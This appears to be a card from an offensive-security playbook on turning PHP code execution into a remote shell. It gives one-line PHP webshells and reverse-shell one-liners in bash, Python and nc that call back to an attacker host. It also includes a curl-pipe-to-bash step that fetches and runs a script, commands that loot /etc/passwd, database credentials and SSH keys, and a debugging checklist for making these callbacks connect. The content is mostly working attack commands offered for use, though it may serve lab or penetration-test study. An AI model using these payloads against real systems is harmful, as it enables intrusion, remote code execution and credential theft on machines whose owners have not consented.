title: PHP Webshell → Shell (cmd-shell + debug ladder)
body: Once you have PHP code execution (LFI->RCE, RFI, file upload, log poisoning), the fastest confirm is a one-line cmd-shell, NOT a reverse shell. Prove execution first with a cmd-shell, THEN go for an interactive shell - that ordering saves you from debugging a reverse shell that was never executing in the first place. The cmd-shell: <?php system($_GET['cmd']); ?> - hit it with &cmd=id and if you see uid=... you have RCE confirmed. The most common silent failure: hosting the payload on Kali's Apache (which EXECUTES the .php before serving it, so the target gets empty output) instead of python3 -m http.server (serves raw bytes - target executes it). When the interactive/reverse shell won't connect, work the debug ladder in cmd order - it's the exact sequence that beats the 'is it SELinux? the VPN? Kali?' spiral. The answer is almost always port mismatch or URL-encoding, not the network.
cmd:
# ══════════════════════════════════════════════════
# STEP 1 - CMD-SHELL: confirm RCE before anything else
# ══════════════════════════════════════════════════
# shell.php (host on Kali):
#   <?php system($_GET['cmd']); ?>
# Host with PYTHON, not Apache (Apache runs the php before serving it -> target gets nothing):
python3 -m http.server 80

# Trigger via your RCE vector (RFI example) and confirm execution:
#   http://TARGET/image.php?img=http://KALI/shell.php&cmd=id
# -> uid=48(apache) ...   = RCE CONFIRMED. If you see raw <?php source, the include isn't executing.

# Other one-line webshells (drop-in):
#   <?php echo shell_exec($_GET['c']); ?>
#   <?php passthru($_REQUEST['cmd']); ?>
#   <?php echo `$_GET[c]`; ?>          # backticks
#   <?php eval($_POST['x']); ?>        # POST, stealthier in logs

# ══════════════════════════════════════════════════
# STEP 2 - INTERACTIVE SHELL via the confirmed cmd-shell
# ══════════════════════════════════════════════════
# Listener FIRST, on 443 or 80 (high ports get egress-filtered):
nc -lvnp 443

# Best method: host the shell as a FILE and curl it (keeps nasty chars OUT of the URL):
#   sh.sh:  bash -i >& /dev/tcp/KALI/443 0>&1
#   &cmd=curl%20KALI/sh.sh%7Cbash         (%7C = pipe)
#   or two steps:  &cmd=curl%20-o%20/tmp/s%20KALI/sh.sh   then   &cmd=bash%20/tmp/s

# ══════════════════════════════════════════════════
# DEBUG LADDER - shell won't connect? Work TOP TO BOTTOM.
# ══════════════════════════════════════════════════
# (1) PORT ALIGNMENT - the #1 cause. The port baked into your payload MUST equal
#     the port nc is listening on RIGHT NOW. Don't ctrl-C and restart nc on a
#     different port between attempts. If using a hardcoded PHP shell, grep it:
#       grep -i port shell.php          # make it match your listener
#
# (2) PROVE EGRESS with ICMP before blaming the network. Ping yourself THROUGH the RCE:
#       sudo tcpdump -i tun0 icmp       # terminal 1
#       &cmd=ping%20-c%203%20KALI       # terminal 2 / browser
#     Replies arrive  -> egress works, it's your PAYLOAD or PORT (not SELinux/VPN/Kali).
#     No replies      -> real egress block; loot via cmd-shell instead (see step 6).
#
# (3) URL-ENCODE the payload. >, &, spaces are STRUCTURAL in a URL and produce 400 Bad Request.
#     Inline bash one-liner encoded:
#       bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FKALI%2F443%200%3E%261%27
#     In Burp: select the cmd value -> Ctrl+U (URL-encode key chars). Or just host-as-file (avoids this).
#
# (4) HOST WITH PYTHON not Apache. If the target fetched your .php but nothing ran,
#     Apache executed it before serving. Use: python3 -m http.server 80
#
# (5) TRY ANOTHER SHELL FLAVOR - system() may invoke sh (dash), where /dev/tcp and >& fail.
#     Force bash via the file method (curl|bash), or use a different language present on the box:
#       python:  python -c 'import socket,os,pty;s=socket.socket();s.connect(("KALI",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
#       nc:      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI 443 >/tmp/f
#       perl:    perl -e 'use Socket;...'        # if perl present
#     Check what's installed:  &cmd=which%20python%20python3%20perl%20nc%20bash
#
# (6) STILL NOTHING? You already have RCE via the cmd-shell - LOOT directly, skip the shell:
#       &cmd=cat%20/etc/passwd
#       &cmd=cat%20/var/www/html/db.php        (DB creds / reused passwords)
#       &cmd=ls%20-la%20/home/*/.ssh           (pull an id_rsa, SSH in instead)
#       &cmd=sudo%20-l
#     Pivot in through SSH with found creds rather than waiting on a callback.
warn: Confirm RCE with the cmd-shell (&cmd=id) BEFORE debugging a reverse shell - half of 'shell won't connect' is actually 'code never executed.' When the box can ping you but no shell connects, it is NOT the network - it's port misalignment or URL-encoding. Host payloads with python3 -m http.server, never Kali's Apache (it executes .php before serving).

choices.label: Reverse shell connected — upgrade the TTY
Shell still won't catch — deeper troubleshooting
Egress blocked — loot via cmd-shell, find creds
Found an SSH key while looting
On the box — start Linux post-exploit enum
